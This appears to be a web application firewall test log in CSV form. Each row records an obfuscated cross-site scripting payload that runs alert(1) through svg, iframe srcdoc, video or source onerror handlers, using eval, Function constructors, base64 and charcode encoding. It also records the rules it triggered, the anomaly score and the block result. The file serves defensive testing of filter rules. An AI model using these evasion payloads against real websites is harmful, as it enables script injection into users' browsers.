3740,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>eval(window['atob']('YWxlcnQoMSk='))</script>""></iframe></div></foreignObject></svg>",0,1,block,9,"933160,933210,934100,941100,941110,941130,941160,941370,949110","o86,36v217,170 || o90,32v217,170t:urlDecode,t:replaceComments,t:compressWhitespace || o86,5v217,170 || v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o91,14v217,170t:urlDecodeUni,t:compressWhitespace || ",40,177603737761.123555
3741,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>eval(self.atob('YWxlcnQoMSk='))</script>""></iframe></div></foreignObject></svg>",0,1,block,7,"933160,934100,941100,941110,941130,941160,949110","o86,31v217,165 || o86,5v217,165 || v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603737830.382036
3742,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>eval(this['atob']('YWxlcnQoMSk='))</script>""></iframe></div></foreignObject></svg>",0,1,block,9,"933160,933210,934100,941100,941110,941130,941160,941370,949110","o86,34v217,168 || o90,30v217,168t:urlDecode,t:replaceComments,t:compressWhitespace || o86,5v217,168 || v217,168t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,168t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,168t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,168t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o91,12v217,168t:urlDecodeUni,t:compressWhitespace || ",40,17760373792.953555
3743,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>Function(atob('YWxlcnQoMSk='))()</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603738192.537131
3744,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>[].constructor.constructor(atob('YWxlcnQoMSk='))()</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,184t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603738335.523302
3745,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>setTimeout(atob('YWxlcnQoMSk='))</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603738465.840052
3746,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>""></iframe></div></foreignObject></svg>",0,1,block,7,"933160,934100,941100,941110,941130,941160,949110","o86,54v217,188 || o86,5v217,188 || v217,188t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,188t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,188t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,188t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603738590.951649
3747,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>eval(`${atob('YWxlcnQoMSk=')}`)</script>""></iframe></div></foreignObject></svg>",0,1,block,8,"932130,933160,934100,941100,941110,941130,941160,949110","o89,21v217,165t:urlDecodeUni,t:cmdLine || o86,31v217,165 || o86,5v217,165 || v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603738740.640085
3749,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>eval(/**/atob/**/(/**/'YWxlcnQoMSk='/**/)/**/)</script>""></iframe></div></foreignObject></svg>",0,1,block,7,"933160,934100,941100,941110,941130,941160,949110","o86,46v217,180 || o86,5v217,180 || v217,180t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,180t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,180t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,180t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603739041.629904
3752,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>eval&#40;atob&#40;'YWxlcnQoMSk='&#41;&#41;</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603739593.443684
3753,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>&#101;val(atob('YWxlcnQoMSk='))</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603739693.325856
3756,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>top['eval'](atob('YWxlcnQoMSk='))</script>""></iframe></div></foreignObject></svg>",0,1,block,7,"933210,941100,941110,941130,941160,941370,949110","o89,30v217,167t:urlDecode,t:replaceComments,t:compressWhitespace || v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,167t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,11v217,167t:urlDecodeUni,t:compressWhitespace || ",30,177603740184.658173
3765,"<svg><image href=""#"" onerror=""(function(){return arguments.callee.constructor})()('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')()""></svg>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941160,949110","o79,8v217,149 || o83,58v217,149 || o30,111v217,149t:urlDecode,t:replaceComments,t:compressWhitespace || o31,11v217,149 || v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o20,9v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,29v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603741415.061737
3781,"<video src onerror=""new(self.Function)('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o23,32v217,57t:urlDecode,t:replaceComments,t:compressWhitespace || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603743747.937815
3783,"<video src onerror=""new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o20,13v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603744098.765770
3791,"<video src onerror=""new Function(atob('YWxlcnQoMSk='))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o20,13v216,58 || v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603745249.416093
3793,"<video src onerror=""new Function('al\x65rt(1)')()"">",0,1,block,5,"934100,941100,941120,941160,949110","o20,13v216,51 || v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v216,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603745550.758851
3794,"<video src onerror=""Function['constructor']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o28,32v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603745692.797160
3795,"<video src onerror=""new Function('al'+String.fromCharCode(101)+'rt(1)')()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o20,13v217,75 || o20,13v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603745823.839066
3796,"<video src onerror=""new Function(unescape('%61%6C%65%72%74%28%31%29'))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o20,13v217,74 || o20,13v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760374592.851094
3805,"<video src onerror=""Reflect.construct(Function,[atob('YWxlcnQoMSk=')])()"">",0,1,block,4,"941100,941120,941160,949110","v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603747270.579605
3812,"<video src onerror=""ne&#119; Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941160,949110","v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603748383.991756
3813,"<video src onerror=""/**/new/**/Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941160,949110","v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760374849.953515
3817,<video src onerror='(new Function(atob`YWxlcnQoMSk=`))()'>,0,1,block,5,"934100,941100,941120,941160,949110","o21,13v216,58 || v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603749078.740369
3822,"<video src onerror='(new(window.Function)(atob(""YWxlcnQoMSk="")))()'>",0,1,block,5,"933210,941100,941120,941160,949110","o20,46v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760374979.359233
3825,"<video src onerror='(function(){return new Function(atob(""YWxlcnQoMSk=""))})()()'>",0,1,block,5,"934100,941100,941120,941160,949110","o21,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603750182.839622
3826,"<video src onerror='(new Function(atob(String.fromCharCode(89,87,120,108,99,110,81,111,77,83,107,61))))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o21,13v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603750220.589778
3833,"<video src onerror='(new top.Function(atob(""YWxlcnQoMSk="")))()'>",0,1,block,4,"941100,941120,941160,949110","v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603751263.764834
3834,"<video src onerror='(new parent.Function(atob(""YWxlcnQoMSk="")))()'>",0,1,block,4,"941100,941120,941160,949110","v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603751366.203941
3837,"<video src onerror='(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()'>",0,1,block,5,"934100,941100,941120,941160,949110","o21,13v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603751762.131365
3839,"<video src onerror='(new/**/(/**/Function/**/(/**/atob/**/(/**/""YWxlcnQoMSk=""/**/)/**/))/**/)/**/()'>",0,1,block,4,"941100,941120,941160,949110","v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603752082.508305
3846,<video src onerror='(new Function(atob([&#x22;YWxlcnQoMSk=&#x22;][0])))()'>,0,1,block,5,"934100,941100,941120,941160,949110","o21,13v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603753052.342078
3848,<video src onerror='(new&#9;Function(atob(&#34;YWxlcnQoMSk=&#34;)))()'>,0,1,block,4,"941100,941120,941160,949110","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603753424.033935
3854,<video src onerror='(new Function(atob(&#x22;YWxlcnQoMSk=&#x22;.toString())))()'>,0,1,block,5,"934100,941100,941120,941160,949110","o21,13v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603754353.568200
3855,"<video><source onerror=""(function(){this['ev\u0061l'](String.fromCharCode(97,108,101,114,116,40,49,41))})()""></video>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o25,11v217,117 || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,17v217,117t:urlDecodeUni,t:compressWhitespace || ",25,177603754558.332165
3856,"<video><source onerror=""(function(){window['Function']('a\x6cert(1)')()})()""></video>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o24,51v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,85 || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,18v217,85t:urlDecodeUni,t:compressWhitespace || ",30,177603754686.351531
3858,"<video><source onerror=""(function(){top['ev'+'al'](atob('YWxlcnQoMSk='))})()""></video>",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o33,6v217,86 || o24,52v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,86 || o25,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,14v217,86t:urlDecodeUni,t:compressWhitespace || ",40,177603755018.582456
3860,"<video><source onerror=""(function(){globalThis['ev\141l'](String.fromCharCode(97,108,101,114,116,40,49,41))})()""></video>",0,1,block,5,"934100,941100,941120,941160,949110","o25,11v217,121 || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603755323.684360
3862,"<video><source onerror=""(function(){this[String.fromCharCode(101,118,97,108)](String.fromCharCode(97,108,101,114,116,40,49,41))})()""></video>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o25,11v217,141 || v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,41v217,141t:urlDecodeUni,t:compressWhitespace || ",25,177603755688.408976
3863,"<video><source onerror=""(function(){window['\u0065val'](String['fromCh\u0061rCode'](97,108,101,114,116,40,49,41))})()""></video>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o25,11v217,127 || v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,19v217,127t:urlDecodeUni,t:compressWhitespace || ",25,177603755790.491031
3866,"<video><source onerror=""(function(){self['Function']('ale'+'rt(1)')()})()""></video>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o24,49v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,83 || o25,11v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,16v217,83t:urlDecodeUni,t:compressWhitespace || ",35,177603756215.869704
3867,"<video><source onerror=""(()=>{Reflect.construct(function(){}.constructor,[String.fromCharCode(97,108,101,114,116,40,49,41)])()})()""></video>",0,1,block,5,"934100,941100,941120,941160,949110","o48,11v217,140 || v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603756311.657052
3868,"<video><source onerror=""(function(){parent['\145\166\141\154'](String.fromCharCode(97,108,101,114,116,40,49,41))})()""></video>",0,1,block,5,"934100,941100,941120,941160,949110","o25,11v217,126 || v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,126t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603756510.215456
3870,"<video><source onerror=""(function(){window['e'+'v'+'a'+'l'](String['fromChar'+'Code'](97,108,101,114,116,40,49,41))})()""></video>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o24,95v217,129t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,129 || o25,11v217,129t:urlDecodeUni || v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,23v217,129t:urlDecodeUni,t:compressWhitespace || ",35,177603756833.719576
